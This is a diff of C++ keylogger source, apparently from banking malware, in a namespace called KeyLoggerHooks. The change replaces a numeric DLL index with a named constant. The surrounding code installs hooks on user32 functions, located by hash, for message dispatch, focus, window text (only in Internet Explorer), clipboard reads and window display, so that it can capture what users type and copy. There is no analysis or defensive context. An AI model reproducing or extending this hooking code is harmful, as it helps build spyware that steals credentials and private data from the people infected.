@@ -400,33 +400,33 @@ namespace KeyLoggerHooks
 		const static DWORD Hash_GetClipboardData = 0x8E7AE818;
 
 
-		if (HookApi(3, Hash_DispatchMessageA, &Hook_DispatchMessageA) )
+		if (HookApi(DLL_USER32, Hash_DispatchMessageA, &Hook_DispatchMessageA) )
 		{
 			__asm mov [Real_DispatchMessageA], eax
 		}
 		else return false;
 
 		
-		if (HookApi(3, Hash_DispatchMessageW, &Hook_DispatchMessageW ) )
+		if (HookApi(DLL_USER32, Hash_DispatchMessageW, &Hook_DispatchMessageW ) )
 		{
 			__asm mov [Real_DispatchMessageW], eax
 		}
 		else return false;
 		
 		
-		if (HookApi(3, HASH_SETFOCUS, &Hook_SetFocus) )
+		if (HookApi(DLL_USER32, HASH_SETFOCUS, &Hook_SetFocus) )
 		{
 			__asm mov [Real_SetFocus], eax
 		}
 		else return false;
 
-		if (HookApi(3, HASH_PEEKMESSAGEA, &Hook_PeekMessageA) )
+		if (HookApi(DLL_USER32, HASH_PEEKMESSAGEA, &Hook_PeekMessageA) )
 		{
 			__asm mov [Real_PeekMessageA], eax
 		}
 		else return false;
 
-		if (HookApi(3, HASH_PEEKMESSAGEW, &Hook_PeekMessageW) )
+		if (HookApi(DLL_USER32, HASH_PEEKMESSAGEW, &Hook_PeekMessageW) )
 		{
 			__asm mov [Real_PeekMessageW], eax
 		}
@@ -435,18 +435,18 @@ namespace KeyLoggerHooks
 		// Установку текста перехватываем только в ИЕ
 		if (Logger->Process == PROCESS_IE)
 		{
-			if (HookApi(3, Hash_SetWindowTextW, &Hook_SetWindowTextW) )
+			if (HookApi(DLL_USER32, Hash_SetWindowTextW, &Hook_SetWindowTextW) )
 			{
 				__asm mov [Real_SetWindowTextW], eax
 			}
 			else return false;
         }
 
-		if( !HookApi(3, Hash_GetClipboardData, &Hook_GetClipboardData, &Real_GetClipboardData) )
+		if( !HookApi(DLL_USER32, Hash_GetClipboardData, &Hook_GetClipboardData, &Real_GetClipboardData) )
 			return false;
 
 
-		HookApi(3, HASH_SHOWWINDOW, &Hook_ShowWindow, &Real_ShowWindow);
+		HookApi(DLL_USER32, HASH_SHOWWINDOW, &Hook_ShowWindow, &Real_ShowWindow);
 
 		KeyLoggerApiHooked = true;
 		return true;
